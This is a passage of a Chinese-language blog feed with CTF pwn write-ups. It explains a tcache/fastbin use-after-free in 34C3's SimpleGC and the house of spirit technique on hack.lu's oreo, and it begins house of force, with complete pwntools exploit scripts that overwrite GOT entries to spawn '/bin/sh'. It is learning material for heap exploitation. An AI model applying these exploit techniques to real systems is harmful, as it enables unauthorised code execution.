class="line">&#123;</div><div class="line">  int v1;</div><div class="line">  group_heap *v2;</div><div class="line">  char nptr;</div><div class="line">  char v4;</div><div class="line">  unsigned __int64 v5;</div><div class="line"></div><div class="line">  printf(&quot;Enter index: &quot;);</div><div class="line">  read_len((__int64)&amp;nptr, 4uLL);</div><div class="line">  v1 = atoi(&amp;nptr);</div><div class="line">  if ( database[v1] )</div><div class="line">  &#123;</div><div class="line">    printf(&quot;Would you like to propagate the change, this will update the group of all the users sharing this group(y/n): &quot;);</div><div class="line">    read_len((__int64)&amp;nptr, 2uLL);</div><div class="line">    printf(&quot;Enter new group name: &quot;);</div><div class="line">    if ( nptr == &apos;y&apos; )</div><div class="line">    &#123;</div><div class="line">      read_len(database[v1]-&gt;group, 0x18uLL);</div><div class="line">    &#125;</div><div class="line">    else</div><div class="line">    &#123;</div><div class="line">      read_len((__int64)&amp;v4, 0x18uLL);</div><div class="line">      v2 = add_group_number(&amp;v4);</div><div class="line">      if ( v2 )</div><div class="line">        database[v1]-&gt;group = v2-&gt;group;</div><div class="line">      else</div><div class="line">        database[v1]-&gt;group = _store_group((__int64)&amp;v4)-&gt;group;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>在这个函数中有两个漏洞，一个输入的v1未经检查，可以造成数组越界的问题</p>
<p>另外一个就是当输入<code>n</code>的时候，会重新增加一个group，然后把当前user的group指向新的group，而当前group的计数位不会减1，这就会导致一个情况，可以让一个group的计数位增加到0x100</p>
<p>再看另一个线程执行的函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">start_routine()</div><div class="line">&#123;</div><div class="line">  unsigned int i;</div><div class="line"></div><div class="line">  sleep(1u);</div><div class="line">  while ( 1 )</div><div class="line">  &#123;</div><div class="line">    for ( i = 0; i &lt;= 0x5F; ++i )</div><div class="line">    &#123;</div><div class="line">      if ( group_database[i] )</div><div class="line">      &#123;</div><div class="line">        if ( !LOBYTE(group_database[i]-&gt;number) )</div><div class="line">        &#123;</div><div class="line">          free((void *)group_database[i]-&gt;group);</div><div class="line">          free(group_database[i]);</div><div class="line">          group_database[i] = 0LL;</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">    sleep(0);</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这个函数是本题的关键函数，属于自己使用代码实现的垃圾回收机制，当group的计数位为0的时候，则表示该group没有user使用，所以进行两个free操作，因为取的是计数位的一个字节，所以如果计数位为0x100，则判断为0，进行free操作，这样将会造成uaf漏洞，释放后的堆还能被使用。</p>
<p>但是这个漏洞的利用太麻烦了，下面，还有一个更容易利用的漏洞</p>
<h2 id="sub-4011c4函数"><a href="#sub-4011c4函数" class="headerlink" title="sub_4011c4函数"></a>sub_4011c4函数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">delete_user()</div><div class="line">&#123;</div><div class="line">  unsigned int v1;</div><div class="line">  char nptr;</div><div class="line">  unsigned __int64 v3;</div><div class="line"></div><div class="line">  printf(&quot;Enter index: &quot;);</div><div class="line">  read_len((__int64)&amp;nptr, 4uLL);</div><div class="line">  v1 = atoi(&amp;nptr);</div><div class="line">  if ( v1 &lt;= 0x5F )</div><div class="line">  &#123;</div><div class="line">    if ( database[v1] )</div><div class="line">    &#123;</div><div class="line">      sub_401139((const char *)database[v1]-&gt;group);</div><div class="line">      free(database[v1]);</div><div class="line">      database[v1] = 0LL;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  else</div><div class="line">  &#123;</div><div class="line">    puts(&quot;invalid index&quot;);</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>在该函数中调用了<code>sub_401139</code>函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">sub_401139(const char *a1)</div><div class="line">&#123;</div><div class="line">  unsigned __int16 i;</div><div class="line"></div><div class="line">  for ( i = 0; i &lt;= 0x5Fu; ++i )</div><div class="line">  &#123;</div><div class="line">    if ( group_database[i] &amp;&amp; !strcmp(a1, (const char *)group_database[i]-&gt;group) )</div><div class="line">    &#123;</div><div class="line">      if ( LOBYTE(group_database[i]-&gt;number) )</div><div class="line">        --LOBYTE(group_database[i]-&gt;number);</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>该函数的目的是，传入被删除的user的group_name，然后到group数据库中去查找是该名字的group，把计数位减1</p>
<p>正常情况下看这逻辑是没问题的，因为无法创建两个同名的group</p>
<p>但是在<code>edit_group</code>函数中，如果输入<code>y</code>的情况下，我们能对group_name进行修改，这样就能导致A和B两个group重名，group_name都为<code>test1</code>，这样在删除的情况下，两个group的计数位都会进行自减1，最后导致uaf漏洞</p>
<h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>使用上述第二个漏洞进行利用</p>
<p>首先增加6个不同group</p>
<table>
<thead>
<tr>
<th>Name</th>
<th>Group_name</th>
<th>Age</th>
</tr>
</thead>
<tbody>
<tr>
<td>a</td>
<td>b</td>
<td>0</td>
</tr>
<tr>
<td>a</td>
<td>bb</td>
<td>0</td>
</tr>
<tr>
<td>a</td>
<td>bbb</td>
<td>0</td>
</tr>
<tr>
<td>a</td>
<td>bbbb</td>
<td>0</td>
</tr>
<tr>
<td>a</td>
<td>bbbbb</td>
<td>0</td>
</tr>
<tr>
<td>a</td>
<td>bbbbbb</td>
<td>0</td>
</tr>
</tbody>
</table>
<p>然后修改第5个group的<code>group_name</code>为<code>bbbbbb</code>和第六个同名</p>
<p>然后我在delete前5个user</p>
<p>这样在主线程中，一个free了5个size=0x21的fastbin，将放入tcache中</p>
<p>然后在子线程中，一个group free了两个size=0x21的fastbin，将放入tcache</p>
<p>不同线程中，tcache的储存位置不同，tcache的一个size一共能储存最多8个该size的chunk，当tcache满了以后，将会放入fastbin中</p>
<p>所以在这一波骚操作以后，主线程的tcache中，一个有5个size=0x21的chunk</p>
<p>而在子线程中，tcache已经被存满了8个size=0x21的chunk</p>
<p>在第5个user被delete的时候，因为第五个user的group_name已经被修改为和第六个user的group_name重名，所以两个group的计数位皆会自减1，然后在子线程中被free，因为这时候该size的tcache中已被填满，所以被free的chunk将会被放入fastbin中，0x20的fastbin将会有4个</p>
<p>这个时候第6个user还存在，但是其group却被free，这造成了uaf漏洞，如果我们输出该user的信息，在group字段后面将会输出fastbin单链表中的fd地址信息，可以计算出堆地址(但是对本题没啥用)</p>
<p>因为第6个user并没有被delete，所以我们仍然能使用<code>edit_group</code>对其的<code>group_name</code>进行修改, 但是因为存储group_name的chunk已经被free，所以我们可以修改该fastbin的fd</p>
<p>修改到地址: 0x6020E0</p>
<p>该地址是user的指针数组，我们把该地址-0x10改写到fastbin的fd中去</p>
<p>然后通过<code>edit_group</code>函数，输入<code>n</code>，进行新建group，首先新建两个group，从tcache中拿出去了4个chunk，因为在主线程中，tcache只有5个chunk，所以再次新建一个group，则会从tcache中拿出最后一个chunk，然后把fastbin中的chunk放入tcache中去，再获取一个chunk</p>
<p>这个时候tcache中size=0x21的chunk指针指向的是(0x6020E0-0x10)</p>
<p>所以我们再次新建一个group，用于储存group_name的chunk的返回地址就是<code>0x6020E0</code></p>
<p>这样我们就能在0x6020E0地址开始任意写入0x18byte的数据</p>
<table>
<thead>
<tr>
<th>/bin/sh\0</th>
</tr>
</thead>
<tbody>
<tr>
<td>0x6020E0</td>
</tr>
<tr>
<td>free_got</td>
</tr>
</tbody>
</table>
<p>把上述数据写入<code>0x6020E0</code>地址后，user[1]指向的就是地址<code>0x6020E0</code>,看起结构体组成：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">database_heap   struc ;</div><div class="line">age             dq ?</div><div class="line">name            dq ?</div><div class="line">group           dq ?</div><div class="line">database_heap   ends</div></pre></td></tr></table></figure>
<p>首先是age，然后是指向name的地址，然后是指向group的地址，当我们输出user1时，在group字段将会输出free_got地址的值，这样就能计算出libc的基地址，从而算出system的地址</p>
<p>我们再把free_got的地址改成system的地址</p>
<p>当我们delete user1时，调用的是free(0x6020E0)，而实际调用的是<code>system(&quot;/bin/sh&quot;)</code>，从而达到getshell的目的</p>
<p>附上完整payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line"># context.log_level = &quot;debug&quot;</div><div class="line"></div><div class="line">def addUser(name, group, age):</div><div class="line">    r.sendlineafter(&quot;Action:&quot;, &quot;0&quot;)</div><div class="line">    r.sendlineafter(&quot;name:&quot;, name)</div><div class="line">    r.sendlineafter(&quot;group:&quot;, group)</div><div class="line">    r.sendlineafter(&quot;age:&quot;, str(age))</div><div class="line"></div><div class="line">def displayGroup(groupName):</div><div class="line">    r.sendlineafter(&quot;Action:&quot;, &quot;1&quot;)</div><div class="line">    r.sendlineafter(&quot;name:&quot;, groupName)</div><div class="line"></div><div class="line">def displayUser(idx):</div><div class="line">    r.sendlineafter(&quot;Action:&quot;, &quot;2&quot;)</div><div class="line">    r.sendlineafter(&quot;index:&quot;, str(idx))</div><div class="line">    r.recvuntil(&quot;Group: &quot;)</div><div class="line">    return r.readline().strip()</div><div class="line"></div><div class="line">def editGroup(idx, propogate, groupName):</div><div class="line">    r.sendlineafter(&quot;Action:&quot;, &quot;3&quot;)</div><div class="line">    r.sendlineafter(&quot;index:&quot;, str(idx))</div><div class="line">    r.sendlineafter(&quot;(y/n):&quot;, propogate)</div><div class="line">    r.sendlineafter(&quot;name:&quot;, groupName)</div><div class="line"></div><div class="line">def deleteUser(idx):</div><div class="line">    r.sendlineafter(&quot;Action:&quot;, &quot;4&quot;)</div><div class="line">    r.sendlineafter(&quot;index:&quot;, str(idx))</div><div class="line"></div><div class="line"></div><div class="line">userArr = 0x6020e0</div><div class="line">free_got = 0x602018</div><div class="line"></div><div class="line">r = process([&apos;/opt/libc-2.26/lib/ld-linux-x86-64.so.2&apos;, &apos;--library-path&apos;, &apos;/opt/libc-2.26/lib/&apos;, &apos;./sgc&apos;])</div><div class="line">e = ELF(&quot;/opt/libc-2.26/lib/libc-2.26.so&quot;)</div><div class="line"></div><div class="line">for i in range(9):</div><div class="line">	addUser(&quot;A&quot;, &quot;B&quot;*i, 0)</div><div class="line"></div><div class="line">editGroup(4,&quot;y&quot;,&quot;B&quot;*5)</div><div class="line"># raw_input()</div><div class="line">for i in range(5):</div><div class="line">	deleteUser(i)</div><div class="line"></div><div class="line">sleep(1)</div><div class="line"></div><div class="line">heap_base = u64(displayUser(5).ljust(8, &apos;\0&apos;)) - 0x590</div><div class="line">log.success(&quot;heap_base at: &quot;+hex(heap_base))</div><div class="line"></div><div class="line">editGroup(5,&quot;y&quot;, p64(userArr-0x10))</div><div class="line"># raw_input()</div><div class="line">editGroup(5, &quot;n&quot;, &quot;1-2&quot;)</div><div class="line">editGroup(5, &quot;n&quot;, &quot;3-4&quot;)</div><div class="line">editGroup(5, &quot;n&quot;, &quot;5-fastbin1&quot;)</div><div class="line"></div><div class="line">payload = &quot;/bin/sh\0&quot;</div><div class="line">payload += p64(userArr)</div><div class="line">payload += p64(free_got)</div><div class="line">editGroup(5, &quot;n&quot;, payload)</div><div class="line"># raw_input()</div><div class="line"></div><div class="line">libc_free = u64(displayUser(1).ljust(8, &apos;\0&apos;))</div><div class="line">libc_base = libc_free - e.symbols[&quot;free&quot;]</div><div class="line">log.success(&quot;libc_base at: &quot;+hex(libc_base))</div><div class="line"></div><div class="line">system_add = libc_base + e.symbols[&quot;system&quot;]</div><div class="line">editGroup(1, &quot;y&quot;, p64(system_add))</div><div class="line">raw_input()</div><div class="line">deleteUser(1)</div><div class="line"></div><div class="line">r.interactive()</div></pre></td></tr></table></figure>
<p>该题中tcache的相关细节我没有细说，因为打算写一篇是专门研究tcache机制的博文</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="http://blog.rh0gue.com/2018-01-05-34c3ctf-simplegc/" target="_blank" rel="external">http://blog.rh0gue.com/2018-01-05-34c3ctf-simplegc/</a></li>
<li><a href="http://tukan.farm/2017/07/08/tcache/" target="_blank" rel="external">http://tukan.farm/2017/07/08/tcache/</a></li>
</ol>
]]></content:encoded>
      
      <comments>http://0x48.pw/2018/01/17/0x40/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Pwn学习之house of系列(一)</title>
      <link>http://0x48.pw/2018/01/16/0x41/</link>
      <guid>http://0x48.pw/2018/01/16/0x41/</guid>
      <pubDate>Tue, 16 Jan 2018 02:25:07 GMT</pubDate>
      <description>
      
        &lt;p&gt;准备些一份house of系列的学习博文，在how2heap上包括下面这些：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;house of spirit&lt;/li&gt;
&lt;li&gt;house_of_force&lt;/li&gt;
&lt;li&gt;house_of_einherjar&lt;/li&gt;
&lt;li&gt;house_of_orange&lt;/li&gt;
&lt;li&gt;house_of_lore&lt;/li&gt;
&lt;/ul&gt;
      
      </description>
      
      <content:encoded><![CDATA[<p>准备些一份house of系列的学习博文，在how2heap上包括下面这些：</p>
<ul>
<li>house of spirit</li>
<li>house_of_force</li>
<li>house_of_einherjar</li>
<li>house_of_orange</li>
<li>house_of_lore</li>
</ul>
<a id="more"></a>
<h1 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house of spirit"></a>house of spirit</h1><p>house of spirit是fastbin的一种利用方法，利用demo可参考: <a href="https://github.com/shellphish/how2heap/blob/master/house_of_spirit.c" target="_blank" rel="external">https://github.com/shellphish/how2heap/blob/master/house_of_spirit.c</a></p>
<p>我通过具体的CTF Pwn题目来学习该利用方法，题目见: <a href="https://github.com/ctfs/write-ups-2014/tree/master/hack-lu-ctf-2014/oreo" target="_blank" rel="external">https://github.com/ctfs/write-ups-2014/tree/master/hack-lu-ctf-2014/oreo</a></p>
<p>这题是hack.lu 2014 ctf的一道400分的32位下的Pwn题，这题原本是没有给libc的，但是我搜了下网上这题的writeup，不需要libc有两种方法，一种是假设服务器上用的是最新版的libc，然后从各个发行版的系统找libc，一个一个试，另一种是使用ret2dl-resolve，这个利用方法我准备单独写一篇博文来说，而本文主要是学习house of spirit，所以就用本地的libc，假设已知libc。</p>
<p>漏洞点很简单，首先要能看出一个结构体：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">struct rifle &#123;</div><div class="line">    char descript[0x19]</div><div class="line">    char name[0x1b]</div><div class="line">    char *pre_add</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>然后在<code>sub_8048644</code>函数中，大致逻辑如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">add()</div><div class="line">&#123;</div><div class="line">  rifles *v1;</div><div class="line">  unsigned int v2;</div><div class="line"></div><div class="line">  v1 = rifle;</div><div class="line">  rifle = (rifles *)malloc(0x38u);</div><div class="line">  if ( rifle )</div><div class="line">  &#123;</div><div class="line">    rifle-&gt;pre_add = (int)v1;</div><div class="line">    printf(&quot;Rifle name: &quot;);</div><div class="line">    fgets(rifle-&gt;name, 56, stdin);</div><div class="line">    str_deal(rifle-&gt;name);</div><div class="line">    printf(&quot;Rifle description: &quot;);</div><div class="line">    fgets(rifle-&gt;descript, 56, stdin);</div><div class="line">    str_deal(rifle-&gt;descript);</div><div class="line">    ++rifle_num;</div><div class="line">  &#125;</div><div class="line">  else</div><div class="line">  &#123;</div><div class="line">    puts(&quot;Something terrible happened!&quot;);</div><div class="line">  &#125;</div></pre></td></tr></table></figure>
<p>结构体中<code>name</code>的长度只有0x1b，但是却能输入56长度的字符串，所以可以把后面的<code>pre_add</code>覆盖，或者把下一个堆进行覆盖</p>
<h2 id="泄露内存"><a href="#泄露内存" class="headerlink" title="泄露内存"></a>泄露内存</h2><p>因为libc已知，程序没开PIE，所以只需要泄露libc地址，然后算出libc基地址</p>
<p>内存泄露利用的是<code>sub_8048729</code>函数，该函数的大致逻辑如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">show_rifles()</div><div class="line">&#123;</div><div class="line">  rifles *i;</div><div class="line">  unsigned int v2;</div><div class="line"></div><div class="line">  printf(&quot;Rifle to be ordered:\n%s\n&quot;, &quot;===================================&quot;);</div><div class="line">  for ( i = rifle; i; i = (rifles *)i-&gt;pre_add )</div><div class="line">  &#123;</div><div class="line">    printf(&quot;Name: %s\n&quot;, i-&gt;name);</div><div class="line">    printf(&quot;Description: %s\n&quot;, i);</div><div class="line">    puts(&quot;===================================&quot;);</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><code>rifle-&gt;pre_add</code>是可控的，把<code>rifle-&gt;pre_add = 0x804A258-25</code>设置为sscanf的got表地址减去25，这样Name输出的就是<code>sscanf_got</code>的值，并且<code>sscanf_got-&gt;pre_add</code>的值为0，能让该程序继续运行而不报错</p>
<p>得到<code>sscanf_got</code>的值后，可以通过libc的偏移算出libc的基地址</p>
<h2 id="使用house-of-spirit进行任意地址写"><a href="#使用house-of-spirit进行任意地址写" class="headerlink" title="使用house_of_spirit进行任意地址写"></a>使用house_of_spirit进行任意地址写</h2><p>house of spirit简单的来说就是free一个假的fastbin堆块，然后再下次malloc的时候就会返回该假堆块</p>
<p>所以第一步是要构造假的堆块，在该程序中，只有一个<code>malloc(0x38)</code>，所以要构造一个<code>size=0x41</code>的堆块，在<code>.bss_804A2A0</code>地址的<code>order_num</code>，和<code>.bss_804A2A4</code>的<code>rifle_num</code>，一个是在free的时候自增1，一个是在rifle add的时候自增1，所以只要add 0x41次rifle，就能把rifle_num设置为0x41</p>
<p>chunk的size位伪造好了，现在是bypass libc对free fastbin的check，主要是会对下一个chunk的size进行check，所以不仅要伪造当前check的size，还要伪造下一个chunk的size</p>
<p>下一个chunk的地址是<code>0x804A2A4+0x40=0x804a2e4</code>，该地址是储存<code>notice</code>的地址，属于可控区域，代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">information = (char *)&amp;unk_804A2C0;</div><div class="line"></div><div class="line">leave()</div><div class="line">&#123;</div><div class="line">  unsigned int v0;</div><div class="line"></div><div class="line">  printf(&quot;Enter any notice you&apos;d like to submit with your order: &quot;);</div><div class="line">  fgets(information, 128, stdin);</div><div class="line">  str_deal(information);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>假堆块构造完成了，free了之后<code>0x804A2A0</code>将会加入到fastbin中，在下一次add rifle的时候malloc会返回该地址，所以<code>0x804A2A4</code>往下的变量都可控，这个时候我们能修改<code>information</code>的值，然后在<code>leave</code>函数会向<code>information</code>指向的地址写入值</p>
<p>这样就达到了任意地址写的目的</p>
<h2 id="最终利用"><a href="#最终利用" class="headerlink" title="最终利用"></a>最终利用</h2><p>能做到任意地址写，下面就很简单了，方法有很多，我使用的是重写<code>sscanf_got</code>地址的值为计算出的<code>system</code>地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">int read_action()</div><div class="line">&#123;</div><div class="line">  int v1; </div><div class="line">  char s;</div><div class="line">  unsigned int v3;</div><div class="line"></div><div class="line">  do</div><div class="line">  &#123;</div><div class="line">    printf(&quot;Action: &quot;);</div><div class="line">    fgets(&amp;s, 32, stdin);</div><div class="line">  &#125;</div><div class="line">  while ( !__isoc99_sscanf(&amp;s, &quot;%u&quot;, &amp;v1) );</div><div class="line">  return v1;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>当输入了<code>/bin/sh</code>之后，会赋值给变量<code>s</code>，然后传给<code>sscanf</code>，这时候<code>sscanf_got</code>的值已经被改成了system的值，所以实际执行的是<code>system(&quot;/bin/sh&quot;)</code></p>
<p>最终达成getshell的目的，payload如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line"># -*- coding=utf-8 -*-</div><div class="line"></div><div class="line">from pwn import *</div><div class="line"></div><div class="line">context.log_level = &quot;debug&quot;</div><div class="line"></div><div class="line">def add(name, descrip):</div><div class="line">    p.readuntil(&quot;Action:&quot;)</div><div class="line">    p.sendline(&quot;1&quot;)</div><div class="line">    p.readuntil(&quot;name:&quot;)</div><div class="line">    p.sendline(name)</div><div class="line">    p.readuntil(&quot;description:&quot;)</div><div class="line">    p.sendline(descrip)</div><div class="line"></div><div class="line">def show_rifles():</div><div class="line">    p.readuntil(&quot;Action:&quot;)</div><div class="line">    p.sendline(&quot;2&quot;)</div><div class="line">    p.readuntil(&quot;Name: &quot;)</div><div class="line">    p.readuntil(&quot;Name: &quot;)</div><div class="line">    return u32(p.read(4))</div><div class="line"></div><div class="line">def free():</div><div class="line">    p.readuntil(&quot;Action:&quot;)</div><div class="line">    p.sendline(&quot;3&quot;)</div><div class="line"></div><div class="line">def leave(message):</div><div class="line">    p.readuntil(&quot;Action:&quot;)</div><div class="line">    p.sendline(&quot;4&quot;)</div><div class="line">    p.readuntil(&quot;order: &quot;)</div><div class="line">    p.sendline(message)</div><div class="line"></div><div class="line"></div><div class="line">sscanf_got = 0x804A258</div><div class="line">fake_heap = 0x804A2A0</div><div class="line">system_offset = 0x3ada0</div><div class="line"></div><div class="line">p = process(&quot;oreo_35f118d90a7790bbd1eb6d4549993ef0&quot;, stdin=PTY)</div><div class="line"></div><div class="line">name_payload1 = &quot;aaa&quot; + &quot;bbbb&quot;*6 + p32(sscanf_got-25)</div><div class="line">add(name_payload1, &quot;hhh&quot;)</div><div class="line">sscanf = show_rifles()</div><div class="line">libc_base = sscanf - 0x5c4c0</div><div class="line">for x in xrange(0x40-1):</div><div class="line">    add(&quot;mm&quot;, &quot;gg&quot;)</div><div class="line"></div><div class="line">name_payload2 = &quot;aaa&quot; + &quot;bbbb&quot;*6 + p32(fake_heap+8)</div><div class="line">add(name_payload2, &quot;uuu&quot;)</div><div class="line">message_payload = &quot;\x00\x00\x00\x00&quot;*9 + p32(0x41)</div><div class="line">leave(message_payload)</div><div class="line"># raw_input()</div><div class="line"></div><div class="line">free()</div><div class="line"># raw_input()</div><div class="line">add(&quot;name&quot;, p32(sscanf_got))</div><div class="line">leave(p32(libc_base+system_offset))</div><div class="line">p.sendline(&quot;/bin/sh\0&quot;)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
<h1 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house of force"></a>house of force</h1><p>house of force是修改top chunk size的一种利用方法，利用demo可参考: <a href="https://github.com/shellphish/how2heap/blob/master/house_of_force.c" target="_blank" rel="external">https://github.com/shellphish/how2heap/blob/master/house_of_force.c</a></p>
<p>题目见: <a href="https://github.com/ctfs/write-ups-2016/tree/master/bctf-2016/exploit/bcloud-200" target="_blank" rel="external">https://github.com/ctfs/write-ups-2016/tree/master/bctf-2016/exploit/bcloud-200</a></p>
<p>该利用姿势是由于libc的堆管理在malloc的时候默认top chunk的size是正确合法的，所以不会去检查top chunk的size值，这就导致了一种情况，当一个程序存在可以修改top chunk size的漏洞时，我们把top chunk的size修改成0xffffffff(x86)</p>
<p>假设这个时候的top_chunk=0x601200, 然后malloc(0xffe00020)，然后对malloc申请的size进行检查，<code>0xffe00030 &lt; top_chunk_size</code>，所以可以成功malloc内存，然后计算top_chunk的新地址：<code>0xffe00030+0x601200=0x100401230</code>, 因为是x86环境，最高位溢出了，所以<code>top_chunk=0x401230</code></p>
<p>然后下次我们再malloc的时候，返回的地址就是<code>0x401238</code></p>
<p>下面，我们再通过2016年bctf的一道题目来加强对该利用方式的理解</p>
<h2 id="泄露堆地址"><a href="#泄露堆地址" class="headerlink" title="泄露堆地址"></a>泄露堆地址</h2><p>有一个read_buffer函数:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">int read_buffer(int input, int len, char a3)</div><div class="line">&#123;</div><div class="line">  char buf;</div><div class="line">  int i;</div><div class="line"></div><div class="line">  for ( i = 0; i &lt; len; ++i )</div><div class="line">  &#123;</div><div class="line">    if ( read(0, &amp;buf, 1u) &lt;= 0 )</div><div class="line">      exit(-1);</div><div class="line">    if ( buf == a3 )</div><div class="line">      break;</div><div class="line">    *(_BYTE *)(input + i) = buf;</div><div class="line">  &#125;</div><div class="line">  *(_BYTE *)(i + input) = 0;         // off by one</div><div class="line">  return i;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>在注释里也已经标出来了，该函数存在off_by_one漏洞，会溢出一个<code>\x00</code></p>
<p>然后存在内存泄露的是需要输入username的函数：</p>
